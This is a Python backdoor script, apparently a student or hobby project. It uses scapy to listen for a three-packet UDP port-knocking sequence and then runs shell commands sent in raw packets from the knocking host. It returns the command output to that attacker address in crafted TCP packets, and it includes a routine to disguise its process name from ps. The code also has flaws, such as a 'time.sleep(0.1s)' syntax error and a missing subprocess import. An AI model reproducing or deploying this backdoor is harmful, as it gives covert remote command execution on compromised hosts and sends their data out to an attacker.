#/usr/bin/python

import socket, os, sys, time, logging
import setproctitle
from scapy.all import *
import config

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
code = 0
attackerIP = ""
attackerPort = 8505

def portKnocking(packet):
    global code
    global attackerIP
    portKnocks = config.portKnocks
    if IP in packet:
        if UDP in packet:
            srcAddr = packet[IP].src
            srcPort = packet[UDP].sport
            if srcPort == portKnocks[0] and code == 0:
                code = 1
                print("{} : Knock 1".format(srcAddr))
            elif srcPort == portKnocks[1] and code == 1:
                code = 2
                print("{} : Knock 2".format(srcAddr))
            elif srcPort == portKnocks[2] and code == 2:
                code = 3
                attackerIP = srcAddr
                print("{}: Knock 3. Authetication succeed.".format(srcAddr))
            else:
                print("Authetication failed (code = 0)")
def craftPacket(ip, port, data):
    packet = IP(dst=ip)/TCP(dport=port)/Raw(load=data)
    return packet

def executeCmd(packet, cmd):
    print("Executing command: {}".format(cmd))
    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = result.stdout.read() + result.stderr.read()
    packet = craftPacket(attackerIP, attackerPort, result)
    send(packet)
    time.sleep(0.1s)


def parsePacket(packet):
    if packet.haslayer(IP) and packet.haslayer(Raw):
        if packet[IP].src != attackerIP:
            return
        payload = packet['Raw'].load
        cmdType, cmdString = payload.split(' ')
        if cmdType == "shell":
            executeCmd(packet, cmdString)
        elif cmdType == "exit":
            print("Backdoor exited.")
            sys.exit(0)
        else:
            print("Incorrected command")


def checkRootPrivilege():
    if os.getuid() != 0:
        sys.exit("This application have to run with root access. Try again")

def maskProcess():
    # Get the most common process for ps command
    cmd = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
    cmdResult = cmd.read()
    setproctitle.setproctitle(cmdResult)
    print("Most common process for ps command: {}".format(cmdResult))

def main():
    #maskProcess()
    checkRootPrivilege()
    while code != 3:
        sniff(filter="udp and dst port 8005", prn=portKnocking, count=1)
    while True:
        sniff(filter="dst port 8505", prn=parsePacket, count=1)


if __name__ == '__main__':
    main()
